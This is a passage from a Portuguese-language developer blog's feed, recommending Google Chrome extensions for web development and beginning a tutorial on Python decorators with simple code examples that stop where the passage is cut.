&lt;p&gt;Venho utilizando alguns &lt;em&gt;add-ons&lt;/em&gt; que me fizeram esquecer rapidamente do &lt;em&gt;Firefox&lt;/em&gt;.
Aqui vai a lista dos meus preferidos:&lt;/p&gt;
&lt;h2&gt;Android SDK Reference Search&lt;/h2&gt;
&lt;p&gt;Para quem está trabalhando com &lt;a href="http://www.android.com/" title="Conheça a plataforma Android"&gt;&lt;em&gt;Android&lt;/em&gt;&lt;/a&gt;, este &lt;em&gt;add-on&lt;/em&gt; pode ser muito
interessante.&lt;/p&gt;
&lt;p&gt;Após instalá-lo, você poderá pesquisar as referências da &lt;em&gt;SDK&lt;/em&gt; do &lt;em&gt;Android&lt;/em&gt;
através da sua barra de endereço. Utilizando o prefixo “&lt;em&gt;ad&lt;/em&gt;“, você pode fazer
pesquisas sobre a &lt;em&gt;SDK&lt;/em&gt; da plataforma com muito mais facilidade.&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://chrome.google.com/webstore/detail/hgcbffeicehlpmgmnhnkjbjoldkfhoin" title="Android SDK Reference"&gt;&lt;em&gt;Android SDK Reference na Chrome Web Store&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;BuiltWith Technology Profiler&lt;/h2&gt;
&lt;p&gt;Este &lt;em&gt;add-on&lt;/em&gt; exibe as principais tecnologias utilizadas por um website,
podendo dar informações mais básicas, como se o website utiliza o
&lt;em&gt;Google Analytics&lt;/em&gt;, até informações mais “obscuras”, como a linguagem de
programação e o servidor &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; utilizado pelo &lt;em&gt;host&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://chrome.google.com/webstore/detail/dapjbgnjinbpoindlpdmhochffioedbn" title="BuiltWith Technology Profiler"&gt;&lt;em&gt;BuiltWith Technology Profiler&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Chrome Sniffer&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/chrome-sniffer-example.png" width="410" height="200" title="Exemplo do Chrome Sniffer" alt="Exemplo do Chrome Sniffer"&gt;&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Chrome Sniffer&lt;/em&gt; traz informações mais específicas que o
&lt;em&gt;BuiltWith Technology&lt;/em&gt;. Por exemplo, através dele sabemos que o website da
&lt;em&gt;Band&lt;/em&gt; utiliza &lt;em&gt;&lt;a href="http://jquery.com/" title="Write less, do more"&gt;jQuery&lt;/a&gt; 1.6&lt;/em&gt;, &lt;em&gt;&lt;a href="http://www.modernizr.com/" title="Front-end development done right"&gt;Modernizr&lt;/a&gt; 1.7&lt;/em&gt; e &lt;em&gt;Google Analytics&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Outro site interessante para avaliarmos é o &lt;a href="http://www.joomla.org/" title="Um dos CMS mais famosos do mundo"&gt;&lt;em&gt;Joomla.org&lt;/em&gt;&lt;/a&gt;, que utiliza o
&lt;em&gt;CMS Joomla!&lt;/em&gt;, &lt;em&gt;Google Analytics&lt;/em&gt; e &lt;em&gt;&lt;a href="http://mootools.net/" title="A compact Javascript framework"&gt;Mootools&lt;/a&gt; 1.12&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://chrome.google.com/webstore/detail/homgcnaoacgigpkkljjjekpignblkeae" title="Chrome Sniffer"&gt;&lt;em&gt;Chrome Sniffer&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Delicious Tools&lt;/h2&gt;
&lt;p&gt;E para quem utiliza o &lt;a href="http://www.delicious.com/" title="Conheça o Delicious"&gt;&lt;em&gt;Delicious&lt;/em&gt;&lt;/a&gt; como &lt;em&gt;bookmark online&lt;/em&gt;, eu recomendo
o &lt;em&gt;Delicious Tools&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;É um dos &lt;em&gt;add-ons&lt;/em&gt; que eu mais utilizo no dia-a-dia. Ele permite que você
adicione links ao seu &lt;em&gt;Delicious&lt;/em&gt; de forma muito prática e rápida. Fica a
dica para você que gosta de armazenar um grande número de &lt;em&gt;urls&lt;/em&gt; em seus
favoritos.&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://chrome.google.com/webstore/detail/gclkcflnjahgejhappicbhcpllkpakej" title="Delicious Tools"&gt;&lt;em&gt;Delicious Tools&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Eye Dropper&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/eyedropper.png" width="160" height="110" title="Plugin Eyer Dropper" alt="Plugin Eyer Dropper"&gt;&lt;/p&gt;
&lt;p&gt;E quando estamos desenvolvendo algum &lt;em&gt;website&lt;/em&gt; e bate aquela dúvida em relação
a cores? O &lt;em&gt;Eye Dropper&lt;/em&gt; facilita a nossa vida!&lt;/p&gt;
&lt;p&gt;Ele é um “conta gotas”, que permite que você capture cores diretamente no
seu navegador, sem precisar utilizar ferramentas gráficas como &lt;a href="http://www.gimp.org/" title="The GNU Image Manipulator"&gt;&lt;em&gt;Gimp&lt;/em&gt;&lt;/a&gt; ou
&lt;a href="http://www.adobe.com/products/photoshop.html" title="A ferramenta gráfica mais popular no mundo"&gt;&lt;em&gt;Photoshop&lt;/em&gt;&lt;/a&gt;. Excelente para aqueles momentos em que estamos focados na
construção de estilos de nossos projetos.&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://chrome.google.com/webstore/detail/hmdcmlfkchdmnmnmheododdhjedfccka" title="Eye Dropper"&gt;&lt;em&gt;Eye Dropper&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Google Mail Checker&lt;/h2&gt;
&lt;p&gt;Se você tem a irritante mania de verificar os seus &lt;em&gt;e-mails&lt;/em&gt; de 5 em 5 minutos,
o &lt;em&gt;Google Mail Checker&lt;/em&gt; pode ser de grande utilidade.&lt;/p&gt;
&lt;p&gt;Este &lt;em&gt;add-on&lt;/em&gt; exibe quantos &lt;em&gt;e-mails&lt;/em&gt; não lidos você tem em sua caixa de
entrada. Um santo remédio para curar essa “síndrome da caixa de entrada”, não?&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://chrome.google.com/webstore/detail/mihcahmgecmbnbcchbopgniflfhgnkff" title="Google Mail Checker"&gt;&lt;em&gt;Google Mail Checker&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Google Reader Notifier&lt;/h2&gt;
&lt;p&gt;Este &lt;em&gt;add-on&lt;/em&gt; produzido pela &lt;em&gt;Google&lt;/em&gt; tem uma finalidade semelhante ao
do &lt;em&gt;Google Mail Checker&lt;/em&gt;, só que ao invés de notificar quantos &lt;em&gt;e-mails&lt;/em&gt; você
têm para ler, ele notifica quantas entradas novas você têm no &lt;em&gt;Google Reader&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Outro grande &lt;em&gt;add-on&lt;/em&gt; para você que não tem tempo a perder.&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://chrome.google.com/webstore/detail/apflmjolhbonpkbkooiamcnenbmbjcbf" title="Google Reader Notifier"&gt;&lt;em&gt;Google Reader Notifier&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;HTML5 Powered&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/html5-powered.png" width="150" height="150" title="HTML5 Powered" alt="HTML5 Powered"&gt;&lt;/p&gt;
&lt;p&gt;Está embarcando na onda do &lt;a href="https://klauslaube.com.br/tag/html5.html" title="Leia mais sobre HTML5"&gt;&lt;em&gt;HTML5&lt;/em&gt;&lt;/a&gt;? Quer saber quais &lt;em&gt;sites&lt;/em&gt; que você navega
que são feitos na linguagem?&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;HTML5 Powered&lt;/em&gt; exibe uma &lt;em&gt;flag&lt;/em&gt; muito simpática na área direita da sua
barra de endereços quando o &lt;em&gt;website&lt;/em&gt; tiver o &lt;em&gt;Doctype&lt;/em&gt; da &lt;em&gt;HTML5&lt;/em&gt;. Este,
junto com o &lt;em&gt;Chrome Sniffer&lt;/em&gt;, são excelentes para você visualizar de forma
rápida as tecnologias utilizadas para desenvolver o &lt;em&gt;website&lt;/em&gt; que você está
visitando.&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://chrome.google.com/webstore/detail/klleofbhhghgacodijohlacbfhfcefom" title="HTML5 Powered"&gt;&lt;em&gt;HTML5 Powered&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;jQuery API Browser&lt;/h2&gt;
&lt;p&gt;Surgiu aquela dúvida sobre a &lt;em&gt;API&lt;/em&gt; da &lt;em&gt;jQuery&lt;/em&gt;? Sem saco de ir até a página da
documentação da biblioteca?&lt;/p&gt;
&lt;p&gt;Com o &lt;em&gt;jQuery API Browser&lt;/em&gt; você faz pesquisas na &lt;em&gt;API&lt;/em&gt; da &lt;em&gt;jQuery&lt;/em&gt; sem precisar
mudar de aba do navegador. Muito útil, principalmente para aquelas dúvidas
bobas que aparecem no meio de uma lógica.&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://chrome.google.com/webstore/detail/abefhanahjellfbchdmkjdcchkogijhk" title="jQuery API Browser"&gt;&lt;em&gt;jQuery API Browser&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;JSLint for Google Chrome&lt;/h2&gt;
&lt;p&gt;E foi-se a época em que o &lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt; era um mero coadjuvante. Hoje em
dia temos até &lt;em&gt;frameworks MVC&lt;/em&gt; para a linguagem!&lt;/p&gt;
&lt;p&gt;Com o &lt;em&gt;JSLint&lt;/em&gt; você é capaz de testar a qualidade do seu &lt;em&gt;script&lt;/em&gt; sem precisar
fazer upload de nenhum arquivo, ou abrir a página oficial da ferramenta.&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://chrome.google.com/webstore/detail/jllekaioicnhoinolncnmofahonmmaio" title="JSLint for Chrome"&gt;&lt;em&gt;JSLint for Google Chrome&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;JSONView&lt;/h2&gt;
&lt;p&gt;Justiça seja feita, o &lt;em&gt;Google Chrome&lt;/em&gt; é péssimo em renderizar formatos
como &lt;em&gt;XML&lt;/em&gt; e &lt;em&gt;JSON&lt;/em&gt;. Se você utiliza &lt;em&gt;JSON&lt;/em&gt; e sente falta de uma visualização
mais amigável por parte do &lt;em&gt;Chrome&lt;/em&gt;, o &lt;em&gt;JSONView&lt;/em&gt; resolve este problema.&lt;/p&gt;
&lt;p&gt;Ele organiza a renderização de um arquivo &lt;em&gt;JSON&lt;/em&gt; em nós, indentando e
respeitando hierarquia. Um dos &lt;em&gt;add-ons&lt;/em&gt; mais simples e eficazes que já
encontrei!&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://chrome.google.com/webstore/detail/chklaanhfefbnpoihckbnefhakgolnmc" title="JSONView"&gt;&lt;em&gt;JSONView&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Migre.me&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/migreme-logo.jpg" width="150" height="150" title="Logotipo do Migre.me" alt="Logotipo do Migre.me"&gt;&lt;/p&gt;
&lt;p&gt;O &lt;a href="http://migre.me/" title="Dê preferência para soluções nacionais"&gt;&lt;em&gt;migre.me&lt;/em&gt;&lt;/a&gt; é o encurtador de &lt;em&gt;URLs&lt;/em&gt; criado pelo hilário &lt;a href="http://twitter.com/jonnyken" title="Siga o Jonny no Twitter"&gt;&lt;em&gt;Jonny Ken&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Encurte &lt;em&gt;URLs&lt;/em&gt; de forma rápida e prática, sem precisar abrir aba de navegador
ou mudar de página. Excelente para quando você está lendo alguma notícia
interessante e quer compartilhá-la com seus amigos no &lt;em&gt;Twitter&lt;/em&gt; ou &lt;em&gt;Facebook&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://chrome.google.com/webstore/detail/fbkejfkcdpnobdcpghmfjnbccfpnblco" title="Migre.me no Google Chrome"&gt;&lt;em&gt;Migre.me no Chrome Web Store&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Pendule&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Pendule&lt;/em&gt; é um &lt;em&gt;set&lt;/em&gt; de ferramentas para desenvolvedores &lt;em&gt;Web&lt;/em&gt;, com
funcionalidades interessantes como &lt;em&gt;reload&lt;/em&gt; de todo o &lt;a href="https://klauslaube.com.br/tag/css.html" title="Leia mais sobre CSS"&gt;&lt;em&gt;CSS&lt;/em&gt;&lt;/a&gt; da página,
redimensionamento da janela e validadores &lt;em&gt;HTML&lt;/em&gt;, &lt;em&gt;CSS&lt;/em&gt; e de acessibilidade.&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://chrome.google.com/webstore/detail/gbkffbkamcejhkcaocmkdeiiccpmjfdi" title="Pendule"&gt;&lt;em&gt;Pendule&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Python Search&lt;/h2&gt;
&lt;p&gt;E nos mesmos moldes do &lt;em&gt;Android SDK Reference Search&lt;/em&gt; temos o &lt;em&gt;Python Search&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Pesquise na documentação oficial do &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; utilizando o sufixo “&lt;strong&gt;py&lt;/strong&gt;”
na sua barra de endereço do &lt;em&gt;Chrome&lt;/em&gt;. A verdade é que é realizada uma busca
no &lt;em&gt;Google&lt;/em&gt;, mas a documentação da linguagem tem maior relevância nos
resultados.&lt;/p&gt;
&lt;p&gt;De qualquer maneira, muito útil para os momentos de aperto.&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://chrome.google.com/webstore/detail/eoonlmlffmpfafcjmkenefnikdhnkgmk" title="Python Search"&gt;&lt;em&gt;Python Search&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Resolution Test&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/resolution-test.png" width="150" height="150" title="Resolution Test" alt="Resolution Test"&gt;&lt;/p&gt;
&lt;p&gt;Quer testar o seu &lt;em&gt;website&lt;/em&gt; nas mais diferentes resoluções possíveis?
O &lt;em&gt;Resolution Test&lt;/em&gt; é um &lt;em&gt;add-on&lt;/em&gt; incrível que permite fazer com que o seu
&lt;em&gt;Google Chrome&lt;/em&gt; fique dos mais variados tamanhos.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Pendule&lt;/em&gt; tem uma funcionalidade similar… portanto fica a opção de escolha.
Venho utilizando o &lt;em&gt;Resolution Test&lt;/em&gt; há muito tempo, por isso recomendo.&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://chrome.google.com/webstore/detail/idhfcdbheobinplaamokffboaccidbal" title="Resolution Test"&gt;&lt;em&gt;Resolution Test&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;SEO Site Tools&lt;/h2&gt;
&lt;p&gt;Um dos mais fantásticos &lt;em&gt;add-ons&lt;/em&gt; que tenho para recomendar!&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;SEO Site Tools&lt;/em&gt; é mais que um &lt;em&gt;add-on&lt;/em&gt;, é uma ferramenta que lhe auxilia a
cuidar da parte de &lt;em&gt;SEO&lt;/em&gt; do seu &lt;em&gt;website&lt;/em&gt;. Inclusive, com informações
referentes a relevância nas mídias sociais, sugestões de melhorias, e o já
clássico &lt;em&gt;PageRank&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://chrome.google.com/webstore/detail/diahigjngdnkdgajdbpjdeomopbpkjjc" title="SEO Site Tools"&gt;&lt;em&gt;SEO Site Tools&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Silver Bird&lt;/h2&gt;
&lt;p&gt;Gosta do &lt;em&gt;Twitter&lt;/em&gt;? O &lt;em&gt;Silver Bird&lt;/em&gt; é um cliente de &lt;em&gt;Twitter&lt;/em&gt; que funciona
diretamente no seu &lt;em&gt;Google Chrome&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Acompanhe o que está “rolando” com seus amigos, e poste na plataforma sem
precisar mudar de página, e de forma rápida. Muito bom!&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://chrome.google.com/webstore/detail/encaiiljifbdbjlphpgpiimidegddhic" title="Silver Bird"&gt;&lt;em&gt;Silver Bird&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Speed Tracer (by Google)&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/speed-tracer-logo.png" width="128" height="128" title="Speed Tracer Logo" alt="Speed Tracer Logo"&gt;&lt;/p&gt;
&lt;p&gt;Quer descobrir como anda a performance da sua aplicação &lt;em&gt;Web&lt;/em&gt;? O &lt;em&gt;Speed Tracer&lt;/em&gt;
pode te mostrar alguns gargalos que venham a ocorrer.&lt;/p&gt;
&lt;p&gt;Com métricas baseadas na execução de &lt;em&gt;Javascript&lt;/em&gt;, tempo de carregamento de
recurso e interpretação de seletores &lt;em&gt;CSS&lt;/em&gt;, pode ser uma ótima ferramenta para
te ajudar a identificar e resolver problemas de performance.&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://chrome.google.com/webstore/detail/ognampngfcbddbfemdapefohjiobgbdl" title="Speed Tracer"&gt;&lt;em&gt;Speed Tracer&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Web Developer&lt;/h2&gt;
&lt;p&gt;E quando você não achar uma ferramenta no &lt;em&gt;Pendule&lt;/em&gt;, tente no &lt;em&gt;Web Developer&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Este &lt;em&gt;add-on&lt;/em&gt;, focado para desenvolvedores &lt;em&gt;Web&lt;/em&gt;, possui alguns diferenciais
em relação ao &lt;em&gt;Pendule&lt;/em&gt;, como um melhor controle sobre imagens, formulários e
estilos. Vale a pena ter os dois à disposição.&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://chrome.google.com/webstore/detail/bfbameneiokkgbdmiekhjnmfkcnldhhm" title="Web Developer"&gt;&lt;em&gt;Web Developer&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;WhatFont&lt;/h2&gt;
&lt;p&gt;Quer descobrir a fonte de um determinado parágrafo? O &lt;em&gt;WhatFont&lt;/em&gt; é um &lt;em&gt;add-on&lt;/em&gt;
maneiríssimo que te permite descobrir não somente a fonte de um texto, mas
também tamanho, tamanho da linha, cor e a família da fonte.&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="http://chengyinliu.com/whatfont.html" title="WhatFont"&gt;&lt;em&gt;WhatFont&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;YSlow&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/yslow-logo.png" width="150" height="150" title="Logotipo do YSlow" alt="Logotipo do YSlow"&gt;&lt;/p&gt;
&lt;p&gt;E por último, mas não menos importante, uma das extensões mais famosas do
&lt;em&gt;Firefox&lt;/em&gt; (entre os desenvolvedores) ganha a sua versão para o &lt;em&gt;Google Chrome&lt;/em&gt;!&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;YSlow&lt;/em&gt; tem certa semelhança com o &lt;em&gt;Speed Trace&lt;/em&gt;, te ajudando a controlar a
performance do seu website ou aplicação &lt;em&gt;Web&lt;/em&gt;. Porém, ele é relativamente mais
simples, e tem um enfoque maior no tempo e consumo de recursos, apresentando
uma nota final (baseada em métricas que estão no
livro “&lt;a href="http://www.oficinadanet.com.br/livro/alta-performance-em-sites-web" title="Leia a resenha do livro"&gt;Alta Performance em Sites Web&lt;/a&gt;“) juntamente com sugestões de
melhorias que deixarão o seu website muito mais rápido.&lt;/p&gt;
&lt;p&gt;Confira: &lt;a href="https://chrome.google.com/webstore/detail/ninejjcohidippngpapiilnmkgllmakh" title="YSlow"&gt;&lt;em&gt;YSlow&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;E você? Tem alguma extensão para recomendar? Compartilhe através dos comentários abaixo…&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="google-chrome"></category></entry><entry><title>Decorators em Python</title><link href="https://klauslaube.com.br/2011/08/02/decorators-em-python.html" rel="alternate"></link><published>2011-08-02T20:00:00-03:00</published><updated>2011-08-02T20:00:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-08-02:/2011/08/02/decorators-em-python.html</id><summary type="html">&lt;p&gt;E na mesma linha dos &lt;a href="https://klauslaube.com.br/2011/05/29/afinal-o-que-sao-closures.html" title="Afinal, o que são Closures?"&gt;&lt;em&gt;closures&lt;/em&gt;&lt;/a&gt;, eu passei a
saber realmente o que são &lt;em&gt;decorators&lt;/em&gt; depois de utilizar o &lt;em&gt;framework&lt;/em&gt;
&lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;. Se você está trabalhando com &lt;a href="https://klauslaube.com.br/tag/oop.html" title="Leia mais sobre OOP"&gt;Orientação a Objetos&lt;/a&gt; e
até agora não se deparou com este recurso, te garanto que um dia você
precisará dele… afinal, é um dos …&lt;/p&gt;</summary><content type="html">&lt;p&gt;E na mesma linha dos &lt;a href="https://klauslaube.com.br/2011/05/29/afinal-o-que-sao-closures.html" title="Afinal, o que são Closures?"&gt;&lt;em&gt;closures&lt;/em&gt;&lt;/a&gt;, eu passei a
saber realmente o que são &lt;em&gt;decorators&lt;/em&gt; depois de utilizar o &lt;em&gt;framework&lt;/em&gt;
&lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;. Se você está trabalhando com &lt;a href="https://klauslaube.com.br/tag/oop.html" title="Leia mais sobre OOP"&gt;Orientação a Objetos&lt;/a&gt; e
até agora não se deparou com este recurso, te garanto que um dia você
precisará dele… afinal, é um dos &lt;a href="http://pt.wikipedia.org/wiki/Padr%C3%A3o_de_projeto_de_software" title="Conheça os Design Patterns"&gt;&lt;em&gt;Design Patterns&lt;/em&gt;&lt;/a&gt; mais bacanas (e
úteis) que já vi.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Vamos lá “decorar” nossos métodos &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;!&lt;/p&gt;
&lt;h2&gt;Decoradores? Really?&lt;/h2&gt;
&lt;p&gt;Eu não saberia explicar de uma forma melhor do que foi explicado pela
&lt;a href="http://pt.wikipedia.org/wiki/Decorator" title="Leia mais sobre o pattern Decorator"&gt;&lt;em&gt;Wikipedia&lt;/em&gt;&lt;/a&gt;, o que é o padrão decorator:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Intenção:&lt;/strong&gt; Acrescentar responsabilidades a um objeto
  dinamicamente. Prover alternativa flexível ao uso de subclasses para
  se estender a funcionalidade de uma classe;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Motivação:&lt;/strong&gt; Objeto usado possui as funcionalidades básicas, mas é
  necessário adicionar funcionalidades adicionais a ele que podem
  ocorrer antes ou depois da funcionalidade básica. Funcionalidades
  devem ser adicionadas em instancias individuais e não na classe;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Consequências:&lt;/strong&gt; Mais flexibilidade do que herança.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Encontramos na &lt;a href="http://wiki.python.org/moin/FrontPage" title="Wiki oficial da linguagem Python"&gt;&lt;em&gt;Wiki&lt;/em&gt; do &lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; uma explicação mais objetiva e
esclarecedora:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Decorators alteram dinamicamente a funcionalidade de uma função,
método ou classe, sem uso direto de subclasses ou alterando o
código-fonte da função “decorada”.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;O uso de decorators em Python&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Python&lt;/em&gt; começou a dar suporte a &lt;em&gt;decorators&lt;/em&gt; a partir da &lt;strong&gt;versão
2.4&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Você terá a sua disposição alguns decoradores &lt;em&gt;built-in&lt;/em&gt; e também poderá
criar os seus próprios sem muito dificuldade. É possível identificar um
&lt;em&gt;decorator&lt;/em&gt; através do caractere &lt;code&gt;@&lt;/code&gt;, por exemplo, a instrução abaixo
declara o método &lt;code&gt;say_hello&lt;/code&gt; da classe &lt;code&gt;People&lt;/code&gt; como estático:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;People&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="nd"&gt;@staticmethod&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;say_hello&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Hello!&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vale notar que podemos reproduzir o comportamento acima sem utilizar a
sintaxe especial de &lt;em&gt;decorators&lt;/em&gt; (mas não deixamos de utilizar o
conceito):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;People&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;say_hello&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Hello!&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;say_hello&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;staticmethod&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;say_hello&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Quer conhecer mais sobre &lt;em&gt;decorators&lt;/em&gt; em &lt;em&gt;Python&lt;/em&gt;? Leia a
&lt;a href="http://www.python.org/dev/peps/pep-0318/" title="Leia mais sobre a PEP318"&gt;&lt;em&gt;PEP 318 – Decorators for functions and methods&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Um pouco de prática&lt;/h2&gt;
&lt;p&gt;Vamos por a mão na massa e criar o nosso próprio &lt;em&gt;decorator&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# meu_decorator.py&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;meu_decorador&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;alvo&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;wrapper&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Chamando a funcao &amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;alvo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__name__&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;alvo&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;wrapper&lt;/span&gt;

&lt;span class="nd"&gt;@meu_decorador&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;meu_alvo&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Eu sou um alvo!&amp;#39;&lt;/span&gt;

&lt;span class="n"&gt;meu_alvo&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Chamando o &lt;em&gt;script&lt;/em&gt; acima, teremos o seguinte resultado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python meu_decorator.py

